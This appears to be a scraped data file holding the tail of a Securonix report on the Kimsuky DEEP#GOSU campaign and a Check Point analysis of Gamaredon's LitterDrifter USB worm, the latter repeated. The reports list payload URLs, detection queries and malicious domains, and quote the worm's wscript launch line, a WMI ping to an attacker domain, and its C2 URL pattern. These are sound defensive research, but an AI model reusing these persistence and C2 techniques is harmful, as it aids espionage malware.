DEEP#GOSU campaign is encrypted and employs legitimate services such as Dropbox or Google Docs, we strongly recommend deploying robust endpoint logging capabilities. This includes leveraging additional process-level logging such asSysmon and PowerShell loggingfor additional log detection coverage.Securonix customers can scan endpoints using the Securonix hunting queries below.C2 and infrastructureC2 Addresshttps://content.dropboxapi.com/2/files/download/step2/ps.binhttps://content.dropboxapi.com/2/files/download/step2/r_enc.binhttps://content.dropboxapi.com/2/files/download/step2/info_sc.txthttps://content.dropboxapi.com/2/files/download/step2/info_ps.binhttps://content.dropboxapi.com/2/files/download/step2/ad_ps.binhttps://content.dropboxapi.com/2/files/download/step2/info_sc.txtgbionet.comMITRE ATT&CK MatrixTacticsTechniquesDefense EvasionT1027: Obfuscated Files or InformationT1027.010: Obfuscated Files or Information: Command ObfuscationT1070.004: Indicator Removal: File DeletionT1140: Deobfuscate/Decode Files or InformationDiscoveryT1057: Process DiscoveryT1082: System Information DiscoveryT1083: File and Directory DiscoveryExecutionT1059: Command and Scripting InterpreterT1059.001: Command and Scripting Interpreter: PowerShellT1059.005: Command and Scripting Interpreter: Visual BasicT1204.001: User Execution: Malicious LinkExfiltrationT1567.002 – Exfiltration Over Web Service: Exfiltration to Cloud StoragePersistenceT1053 – Scheduled Task/JobCommand and ControlT1102: Web ServiceT1132.001: Data Encoding: Standard EncodingT1219 – Remote Access SoftwareT1573: Encrypted ChannelCollectionT1115 – Clipboard DataT1056.001 – Input Capture: KeyloggingRelevant provisional Securonix detectionsEDR-ALL-623EREDR-ALL-335-RUEDR-ALL-336-RUEDR-ALL-928-RURelevant hunting queries(remove square brackets “[ ]” for IP addresses or URLs)index = activity AND rg_functionality=”Next Generation Firewall” AND requesturl CONTAINS “content.dropboxapi[.]com/2/files/download/step2/” AND (requesturl CONTAINS “ps.bin” OR requesturl CONTAINS “r_enc.bin” OR requesturl CONTAINS “info_sc.txt” OR requesturl CONTAINS “info_ps.bin” OR requesturl CONTAINS “ad_ps.bin”)index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “File created” OR deviceaction = “File created (rule: FileCreate)”) AND customstring49 ENDS WITH “Appdata\Microsoft\Windows\Themes\version.xml”index = activity AND rg_functionality = “Microsoft Windows Powershell” AND (message CONTAINS “content.dropboxapi[.]com/2/files/download” OR message CONTAINS “content.dropboxapi[.]com/2/files/upload”)index = activity AND rg_functionality = “Endpoint Management Systems” AND (deviceaction = “File created” OR deviceaction = “File created (rule: FileCreate)”) AND customstring49 CONTAINS “\AppData\Local\Temp\” AND customstring49 CONTAINS “.zip” AND customstring49 ENDS WITH “.lnk”Analyzed files/hashesNameFILE HASHIMG_20240214_0001.pdf.lnkF262588C48D2902992FFD275D2BE6362FE7F02E2F00A44AB8C75AC1A2827C6E91617587CCDF5B0344089559ECF8FE7D39F6E07A6A64F74F2B44BFA2C8CB67983트레이딩 스파르타코스 강의안-100불남(2차).zip46A5D54C264152CE915792AF31C75824A558AF7D7340D78B34E146D8C6249E79트레이딩_스파르타코스_강의안_100불남_2차.pdf.lnk1B75F70C226C9ADA8E79C3FDD987277B0199928800C51E5A1E55FF01246701DBIMG_20240214_0001.pdf69C917EA96DB28DBD5B67073CA0AAC234D25651A849171B45F20979EAFA05A1CPowerShell file hashes60666CACDD6806ED05771F32EAA719E3EFD2F4DB55F28A447D383C3EAC1DC72EB72CAAB78D164637FEA0937D7A94FC470579EC6BB4FA87DADB6F0FA7826E217C89CAD9A57985CC0AB3B7403A943AD0AA7B167DC7A3C38557417FEDEA67A77B87References:North Korean Advanced Persistent Threat Focus: Kimsukyhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa20-301aThreat Intelligence Report: Kimsukyhttps://www.genians.co.kr/hubfs/blogfile/20231030_threat_inteligence_report_Kimsuky.pdfDark Pink – New APT hitting Asia-Pacific, Europe that goes deeper and darkerhttps://www.group-ib.com/blog/dark-pink-apt/February 2023 – Threat Trend Report on Kimsuky Grouphttps://asec.ahnlab.com/wp-content/uploads/2023/04/ATIP_2023_Feb_Threat-Trend-Report-on-Kimsuky-Group.pdfMalware Disguised as HWP Document File (Kimsuky)https://asec.ahnlab.com/en/54736/Related ResourceResearch Update: Threat Actors Behind the DEV#POPPER Campaign Have Retooled...Threat Actors are Exploiting the Recent CrowdStrike Outage in an Effort to...The Ghost in the Machine: Tracking Stealthy Fileless Malware in the Windows...5 Cyber Threats Facing the Financial Service Sector in 2024Previous ArticleSecuronix Threat Labs Monthly Intelligence Insights – February 2024Next ArticleThreat Hunting ArchitectureSecuronix 2024. All Rights ReservedLegal Center|Privacy PolicyLinkedinTwitterYoutubeContact UsWhy SecuronixWhy SecuronixThreat LabsAnalyst ResourcesCompare UsProductsPlatformBring Your Own SnowflakeBring Your Own AWSSecuronix EONUnified Defense SIEMUEBASOARATSInvestigateSolutionsCloud Security MonitoringAmazon Web ServicesGoogle Cloud PlatformMicrosoft AzureMicrosoft 365Insider ThreatNDREMR MonitoringMITRE ATT&CKFinancial ServicesHealthcareResourcesResourcesResource LibraryLegal CenterOpen Source Software Listing – 5.0Open Source Software Listing – 6.0CompanyAboutLeadershipNewsroomPressCareersAwardsEventsServicesTrainingSupport ServicesProfessional ServicesPartnersSolution ProvidersMSSPsSystem IntegratorsTechnology PartnersPartner Portal Login"
https://research.checkpoint.com/2023/malware-spotlight-into-the-trash-analyzing-litterdrifter/,"Gamaredon, also known as Primitive Bear, ACTINIUM, and Shuckworm, is a unique player in the Russian espionage ecosystem that targets a wide variety of almost exclusively Ukrainian entities. While researchers often struggle to uncover evidence of Russian espionage activities, Gamaredon is notably conspicuous. The group behind it conducts large-scale campaigns while still primarily focusing on regional targets. The Security Service of Ukraine (SSU)identifiedthe Gamaredon personnel as Russian Federal Security Service (FSB) officers. Gamaredon’s large-scale campaigns are usually followed by data collection efforts aimed at specific targets, whose selection is likely motivated by espionage goals. These efforts run parallel to the deployment of various mechanisms and tools designed to maintain as much access to these targets as possible. One such tool is a USB propagating worm that we have namedLitterDrifter. The LitterDrifter worm is written in VBS and has two main functionalities: automatic spreading over USB drives, and communication with a broad, flexible set of command-and-control servers. These features are implemented in a manner that aligns with the group’s goals, effectively maintaining a persistent command and control (C2) channel across a wide array of targets. LitterDrifter seems to be an evolution of a previously reported activitytyingGamaredon group to a propagating USB Powershell worm. In this report, we take an extensivedumpster diveinto the analysis of Gamaredon’sLitterDriftermalware, as well as its C2 infrastructure. Figure 1 – Virus Total Submissions of LitterDrifter The LitterDrifter is a self-propagating worm with two main functionalities: spreading over drives and establishing a C2 channel to Gamaredon’s wide command and control infrastructure. Those two functionalities reside within an orchestration component saved to disk as “trash.dll”, which is actually a VBS, despite its file extension name. trash.dll, as the initial orchestration component, runs first and its main function is to decode and execute the other modules and maintain initial persistence in the victim’s environment. Following a successful execution, it runs the two extracted modules: 1.Spreader module– Distributes the malware in the system and potentially spreads it to other environments by prioritizing infection of a logical disk withmediatype=NULL, usually associated with USB removable media. 2.C2 Module– Retrieves a command and control server IP address by generating a random subdomain of a built-in C2 server, while also maintaining a backup option to retrieve a C2 IP address from a Telegram channel. Its main purpose is to establish communication with the attacker C&C server and to execute incoming payloads. The orchestration component (referred to as DEOBFUSCODER) is heavily obfuscated and is constructed from a series of strings with character substitution obfuscation. It consists of 7 functions and variables with name mangling. Throughout the run of the “Deobfucate” action, LitterDrifter invokes a function that delays the execution for a few seconds (the exact time varies from sample to sample) to delay the following actions. The entire flow is deliberately obscured by ambiguous function and variable names as well as the use of inline scripting, which make it difficult for casual observers to discern its intent and activities. The core essence of the Spreader module lies in recursively accessing subfolders in each drive and creating LNK decoy shortcuts, alongside a hidden copy of the “trash.dll” file. Upon execution, the module queries the computer’s logical drives using Windows Management Instrumentation (WMI), and searches for logical disks with theMediaTypevalue set tonull, a method often used to identify removable USB drives. For each logical drive detected, the spreader invokes thecreateShortcutsInSubfoldersfunction. Within this function, it iterates the subfolders of a provided folder up to a depth of 2. For every subfolder, it employs theCreateShortcutfunction as part of the “Create LNK” action, which is responsible for generating a shortcut with specific attributes. These shortcuts are LNK files that are given random names chosen from an array in the code. This is an example of the lure’s names from an array in one of the samples that we investigated:(""Bank_accоunt"", ""постановa"", ""Bank_accоunt"", ""службовa"", ""cоmpromising_evidence""). The LNK files use wscript.exe **** to execute “trash.dll” with specified arguments"" """"trash.dll"""" /webm //e:vbScript //b /wm /cal "". In addition to generating the shortcut, the function also creates a hidden copy of “trash.dll” in the subfolder. Gamaredon’s approach towards the C&C is rather unique, as it utilizes domains as a placeholder for the circulating IP addresses actually used as C2 servers. Before attempting to contact a C2 server, the script checks the%TEMP%folder for an existing C2 configuration file with a meaningless name that’s hardcoded in the malware. This mechanism acts as a self-check for the malware, verifying whether it already infected the machine. If present, the current execution could simply be a scheduled execution triggered by the persistence mechanisms discussed earlier. If there isn’t an existing config file, the malware switches gears and pings one of Gamaredon’s domains using a WMI query:select * from win32_pingstatus where address='Write<random_2_digit_number>.ozaharso.ru’.The malware extracts the IP resolution for the domain from the response to the query and saves it to a new configuration file. With the IP address in hand, LitterDrifter constructs the IP into a URL. The format is usually along the lines ofhttp://<cncIP>/jaw<random_2_digit_number>/index.html=?<random_2_digit_number>. The C2 communication is carried out using a custom user-agent that contains some information about the machine. This information includes the computer name and a hexadecimal form of the%systemdrive%’s serial number. The end result is a user-agent that looks like this:mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/88.0.4324.152 yabrowser/21.2.3.106 yowser/2.5 safari/537.36;;<computer_name>_<system_drive_serial>;;/.justly/. The request’s HTTP header is also carefully tailored. For example, in one of the samples we found, theRefererfield discreetly holdshttps://www.crimea.kp.ru/daily/euromaidan/, a nod to Crimea’s news site. It also sneaks in some specifics for theAccept-Languageand the stringmarketCookiein theCookiefield. LitterDrifter utilizes a fail counter to choose which C2 method is relevant. The fail counter increases each time the C2 fails to return either a payload or a Telegram backup channel, from which LitterDrifter extracts an alternative C2. The flow of the code suggests the first answer to return is usually a Telegram channel ID, which is saved in a backup file. Based on the fail count, LitterDrifter chooses to which C2 to connect: If a payload is found within the C2 reply, LitterDrifter tries to decode it. It unwraps any base64 content and attempts to run the decoded data. Based on our analysis, the payload is not downloaded to most targets. During our analysis, we noticed distinct patterns in the infrastructure employed by Gamaredon in this operation. This includes registration patterns, as all of the domains used by Gamaredon’s LitterDrifter are registered byREGRU-RU. and are part of the TLD.ru. These findingsalignwith other pastreportsof Gamaredon’s infrastructure. Based on some of the patterns, we were able to associate specific domains and subdomains with LitterDriffter’s operation, and other domains that are linked to other clusters of Gamaredon’s activity. In the LitterDrifter campaign, the C2 module gets the resolution for a Gamaredon-owned domain through a WMI query. It does so by generating a random subdomain of a hardcoded domain, using random words and digits so each domain exhibits a diverse range of associated subdomains. Some domains have just a few subdomains, while others have several hundred. The following charts show the number of subdomains for each of the domains we encountered: As we described earlier, the WMI query to Gamaredon’s domain returns an IP address that is used as the operational C2 of the campaign. On average, an IP address remains operational for roughly 28 hours. However, the IP address serving as the active C2 usually changes several times a day (all of the IP addresses used might fall within the same subnet), as seen below: In this report, we explored the inner workings of this recently identified worm. Comprised of two primary components – a spreading module and a C2 module – it’s clear that LitterDrifter was designed to support a large-scale collection operation. It leverages simple, yet effective techniques to ensure it can reach the widest possible set of targets in the region. LitterDrifter doesn’t rely on groundbreaking techniques and may appear to be a relatively unsophisticated piece of malware. However, this same simplicity is in line with its goals, mirroring Gamaredon’s overall approach. This method has demonstrated considerable effectiveness, as evidenced by the group’s sustained activities in Ukraine. Check Point Customers remain protected against attacks detailed in this report while usingCheck Point Harmony EndpointandThreat Cloud. LitterDrifter samples cbeaedfa84b02a2bd41a70fa92a46c36 6349dd85d9549f333117a84946972d06 2239800bfc8fdfddf78229f2eb8a7b95 42bc36d5debc21dff3559870ff300c4e 4c2431e5f868228c1f286fca1033d221 1536ec56d69cc7e9aebb8fbd0d3277c4 49d1f9ce1d0f6dfa94ad9b0548384b3a 83500309a878370722bc40c7b83e83e3 8096dfaa954113242011e0d7aaaebffd bbb464b327ad259ad5de7ce3e85a4081 cdae1c55ec154cd6cef4954519564c01 2996a70d09fff69f209051ce75a9b4f8 9d9851d672293dfd8354081fd0263c13 96db6240acb1a3fca8add7c4f9472aa5 1c49d04fc0eb8c9de9f2f6d661826d24 88aba3f2d526b0ba3db9bc3dfee7db39 86d28664fc7332eafb788a44ac82a5ed 1da0bf901ae15a9a8aef89243516c818 579f1883cdfd8534167e773341e27990 495b118d11ceae029d186ffdbb157614 Infrastructure ozaharso[.]ru nubiumbi[.]ru acaenaso[.]ru atonpi[.]ru suizibel[.]ru dakareypa[.]ru ahmozpi[.]ru nebtoizi[.]ru squeamish[.]ru nahtizi[.]ru crisiumbi[.]ru arabianos[.]ru gayado[.]ru quyenzo[.]ru credomched[.]ru lestemps[.]ru urdevont[.]ru hoanzo[.]ru absorbeni[.]ru aethionemaso[.]ru aychobanpo[.]ru ayzakpo[.]ru badrupi[.]ru barakapi[.]ru boskatrem[.]ru brudimar[.]ru decorous[.]ru dumerilipi[.]ru heartbreaking[.]ru judicious[.]ru karoanpa[.]ru lamentable[.]ru procellarumbi[.]ru ragibpo[.]ru raidla[.]ru ramizla[.]ru samiseto[.]ru superficial[.]ru talehgi[.]ru undesirable[.]ru valefgo[.]ru vasifgo[.]ru vilaverde[.]ru vloperang[.]ru zerodems[.]ru geminiso[.]ru vilaverde[.]ru lamentable[.]ru raidla[.]ru boskatrem[.]ru heartbreaking[.]ru sabirpo[.]ru valefgo[.]ru vasifgo[.]ru absorbeni[.]ru vloperang[.]ru decorous[.]ru ramizla[.]ru procellarumbi[.]ru andamanos[.]ru triticumos[.]ru Subscribe for cpr blogs, news and more Subscribe Now © 1994-2024 Check Point Software Technologies LTD. All rights reserved. Property ofCheckPoint.com Privacy Policy  First Name Last Name Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) Email  BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.","    23 4 3 383 1 43 2 1 0 22 316 12 1 1 1 0 172 9 0 February 17, 2020 August 11, 2017 January 11, 2018    —Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) ","Malware Spotlight - Into the Trash: Analyzing LitterDrifter - Check Point ResearchCONTACT USDISCLOSURE POLICYCHECKPOINT.COMUNDER ATTACK?Latest PublicationsCPR Podcast ChannelWeb 3.0 SecurityIntelligence ReportsResourcesThreatCloud AIThreat Intelligence & ResearchZero Day ProtectionSandblast File AnalysisAbout UsSUBSCRIBESUBSCRIBECATEGORIESAndroid Malware23Artificial Intelligence4ChatGPT3Check Point Research Publications383Cloud Security1CPRadio43Crypto2Data & Threat Intelligence1Data Analysis0Demos22Global Cyber Attack Reports316How To Guides12Ransomware1Russo-Ukrainian War1Security Report1Threat and data analysis0Threat Research172Web 3.0 Security9Wipers0Malware Spotlight – Into the Trash: Analyzing LitterDrifterNovember 17, 2023https://research.checkpoint.com/2023/malware-spotlight-into-the-trash-analyzing-litterdrifter/IntroductionGamaredon, also known as Primitive Bear, ACTINIUM, and Shuckworm, is a unique player in the Russian espionage ecosystem that targets a wide variety of almost exclusively Ukrainian entities. While researchers often struggle to uncover evidence of Russian espionage activities, Gamaredon is notably conspicuous. The group behind it conducts large-scale campaigns while still primarily focusing on regional targets. The Security Service of Ukraine (SSU)identifiedthe Gamaredon personnel as Russian Federal Security Service (FSB) officers.Gamaredon’s large-scale campaigns are usually followed by data collection efforts aimed at specific targets, whose selection is likely motivated by espionage goals. These efforts run parallel to the deployment of various mechanisms and tools designed to maintain as much access to these targets as possible. One such tool is a USB propagating worm that we have namedLitterDrifter.The LitterDrifter worm is written in VBS and has two main functionalities: automatic spreading over USB drives, and communication with a broad, flexible set of command-and-control servers. These features are implemented in a manner that aligns with the group’s goals, effectively maintaining a persistent command and control (C2) channel across a wide array of targets. LitterDrifter seems to be an evolution of a previously reported activitytyingGamaredon group to a propagating USB Powershell worm.In this report, we take an extensivedumpster diveinto the analysis of Gamaredon’sLitterDriftermalware, as well as its C2 infrastructure.Key PointsGamaredon continues to focus on wide variety Ukrainian targets, but due to the nature of the USB worm, we see indications of possible infection in various countries like USA, Vietnam, Chile, Poland and Germany. In addition, we’ve observed evidence of infections in Hong Kong. All this might indicate that much likeother USB worms, LitterDrifter have spread beyond its intended targets.Figure 1 – Virus Total Submissions of LitterDrifterThe group recently started deploying LitterDrifter, a worm written in VBS, designed to propagate through removable USB drives and secure a C2 channel.Gamaredon’s infrastructure remains extremely flexible and volatile, while at the same time maintaining previously reported characteristics and patterns.LitterDrifter OverviewThe LitterDrifter is a self-propagating worm with two main functionalities: spreading over drives and establishing a C2 channel to Gamaredon’s wide command and control infrastructure. Those two functionalities reside within an orchestration component saved to disk as “trash.dll”, which is actually a VBS, despite its file extension name.Figure 2 – A high-level execution scheme of LitterDrifter.trash.dll, as the initial orchestration component, runs first and its main function is to decode and execute the other modules and maintain initial persistence in the victim’s environment.Following a successful execution, it runs the two extracted modules:1.Spreader module– Distributes the malware in the system and potentially spreads it to other environments by prioritizing infection of a logical disk withmediatype=NULL, usually associated with USB removable media.2.C2 Module– Retrieves a command and control server IP address by generating a random subdomain of a built-in C2 server, while also maintaining a backup option to retrieve a C2 IP address from a Telegram channel. Its main purpose is to establish communication with the attacker C&C server and to execute incoming payloads.Dumpster DivingDeobfuscoding the DEOBFUSCODERThe orchestration component (referred to as DEOBFUSCODER) is heavily obfuscated and is constructed from a series of strings with character substitution obfuscation. It consists of 7 functions and variables with name mangling. Throughout the run of the “Deobfucate” action, LitterDrifter invokes a function that delays the execution for a few seconds (the exact time varies from sample to sample) to delay the following actions.The main function takes two encoded strings (the other two malicious components) as parameters. It then declares two paths under the user’s “Favorites” directory, designed to store the two decoded scripts from the other 2 encoded components of the VBS.To ensure its persistence, the Deobfuscoder makes a copy of the original script to a hidden file called “trash.dll” in the user’s directory.The script decodes the provided encoded strings and writes them to the “Favorites” directory as “jersey.webm”, the payload component, and “jaw.wm”, the spreader component (the names and extensions of the files and also the location inside the%userprofile%differ between variants).After creating these files, the malware proceeds to set scheduled tasks for each of the 2 components, ensuring they are regularly executed. In addition, it adds an entry to the user’s startup items in the Registry Run Keys to ensure they run upon startup.Both the tasks and the startup entries are disguised using technical-sounding names such as “RunFullMemoryDiagnostic” and “ProcessMemoryDiagnosticEvents” to appear legitimate and avoid arousing suspicion.Figure 3 – Deobfuscated snippet of the orchestrator DEOBFUSCODER’s Main Function.The entire flow is deliberately obscured by ambiguous function and variable names as well as the use of inline scripting, which make it difficult for casual observers to discern its intent and activities.Spreader Module AnalysisThe core essence of the Spreader module lies in recursively accessing subfolders in each drive and creating LNK decoy shortcuts, alongside a hidden copy of the “trash.dll” file.Figure 4 – trash.dll is distributed as a hidden file in a USB drive together with a decoy LNK.Upon execution, the module queries the computer’s logical drives using Windows Management Instrumentation (WMI), and searches for logical disks with theMediaTypevalue set tonull, a method often used to identify removable USB drives.Figure 5 – LitterDrifter’s spreader component.For each logical drive detected, the spreader invokes thecreateShortcutsInSubfoldersfunction. Within this function, it iterates the subfolders of a provided folder up to a depth of 2.For every subfolder, it employs theCreateShortcutfunction as part of the “Create LNK” action, which is responsible for generating a shortcut with specific attributes. These shortcuts are LNK files that are given random names chosen from an array in the code. This is an example of the lure’s names from an array in one of the samples that we investigated:(""Bank_accоunt"", ""постановa"", ""Bank_accоunt"", ""службовa"", ""cоmpromising_evidence""). The LNK files use wscript.exe **** to execute “trash.dll” with specified arguments"" """"trash.dll"""" /webm //e:vbScript //b /wm /cal "". In addition to generating the shortcut, the function also creates a hidden copy of “trash.dll” in the subfolder.Figure 6 – A function in the Spreader component used to iterate subfolders.C2 Module Analysis – Taking Out the TrashGamaredon’s approach towards the C&C is rather unique, as it utilizes domains as a placeholder for the circulating IP addresses actually used as C2 servers.Before attempting to contact a C2 server, the script checks the%TEMP%folder for an existing C2 configuration file with a meaningless name that’s hardcoded in the malware. This mechanism acts as a self-check for the malware, verifying whether it already infected the machine. If present, the current execution could simply be a scheduled execution triggered by the persistence mechanisms discussed earlier. If there isn’t an existing config file, the malware switches gears and pings one of Gamaredon’s domains using a WMI query:select * from win32_pingstatus where address='Write<random_2_digit_number>.ozaharso.ru’.The malware extracts the IP resolution for the domain from the response to the query and saves it to a new configuration file.Figure 7 – LitterDrifter retrieving the C2 IP address using a WMI query.With the IP address in hand, LitterDrifter constructs the IP into a URL. The format is usually along the lines ofhttp://<cncIP>/jaw<random_2_digit_number>/index.html=?<random_2_digit_number>. The C2 communication is carried out using a custom user-agent that contains some information about the machine. This information includes the computer name and a hexadecimal form of the%systemdrive%’s serial number.The end result is a user-agent that looks like this:mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/88.0.4324.152 yabrowser/21.2.3.106 yowser/2.5 safari/537.36;;<computer_name>_<system_drive_serial>;;/.justly/.Figure 8 – LitterDrifter prepares the HTTP request, constructing the URL and user-agent.The request’s HTTP header is also carefully tailored. For example, in one of the samples we found, theRefererfield discreetly holdshttps://www.crimea.kp.ru/daily/euromaidan/, a nod to Crimea’s news site. It also sneaks in some specifics for theAccept-Languageand the stringmarketCookiein theCookiefield.Figure 9 – HTTP request function.LitterDrifter utilizes a fail counter to choose which C2 method is relevant. The fail counter increases each time the C2 fails to return either a payload or a Telegram backup channel, from which LitterDrifter extracts an alternative C2. The flow of the code suggests the first answer to return is usually a Telegram channel ID, which is saved in a backup file.Based on the fail count, LitterDrifter chooses to which C2 to connect:If the fail counter is currently set to 0, the request is carried out to the file saved in the configuration file.If the fail counter is currently set to 1, LitterDrifter attempts to resolve its embedded C2 domain using a WMI Query, as previously described.If the fail counter is set to 2, LitterDrifter attempts to connect to a C2 extracted from a Telegram backup channel, using a different user-agent and aRefererofhttps://www.interfax.ru/tags/, which is another Russian news site. From there, it extracts an IP address used as a C2.Figure 10 – Gamaredon’s Telegram channel that conceals a C&C IP address.If a payload is found within the C2 reply, LitterDrifter tries to decode it. It unwraps any base64 content and attempts to run the decoded data. Based on our analysis, the payload is not downloaded to most targets.Figure 11 – LitterDrifter’s fail count options and execution of a received payload (Deobfuscated).InfrastructureDuring our analysis, we noticed distinct patterns in the infrastructure employed by Gamaredon in this operation. This includes registration patterns, as all of the domains used by Gamaredon’s LitterDrifter are registered byREGRU-RU. and are part of the TLD.ru. These findingsalignwith other pastreportsof Gamaredon’s infrastructure.Based on some of the patterns, we were able to associate specific domains and subdomains with LitterDriffter’s operation, and other domains that are linked to other clusters of Gamaredon’s activity.In the LitterDrifter campaign, the C2 module gets the resolution for a Gamaredon-owned domain through a WMI query. It does so by generating a random subdomain of a hardcoded domain, using random words and digits so each domain exhibits a diverse range of associated subdomains. Some domains have just a few subdomains, while others have several hundred. The following charts show the number of subdomains for each of the domains we encountered:Figure 12 – Number of subdomains per domain.As we described earlier, the WMI query to Gamaredon’s domain returns an IP address that is used as the operational C2 of the campaign. On average, an IP address remains operational for roughly 28 hours. However, the IP address serving as the active C2 usually changes several times a day (all of the IP addresses used might fall within the same subnet), as seen below:Figure 13 – Number of C&C IP addresses per day in the past 2 months.ConclusionIn this report, we explored the inner workings of this recently identified worm. Comprised of two primary components – a spreading module and a C2 module – it’s clear that LitterDrifter was designed to support a large-scale collection operation. It leverages simple, yet effective techniques to ensure it can reach the widest possible set of targets in the region.LitterDrifter doesn’t rely on groundbreaking techniques and may appear to be a relatively unsophisticated piece of malware. However, this same simplicity is in line with its goals, mirroring Gamaredon’s overall approach. This method has demonstrated considerable effectiveness, as evidenced by the group’s sustained activities in Ukraine.Check Point Customers Remain ProtectedCheck Point Customers remain protected against attacks detailed in this report while usingCheck Point Harmony EndpointandThreat Cloud.Indicators of CompromiseLitterDrifter 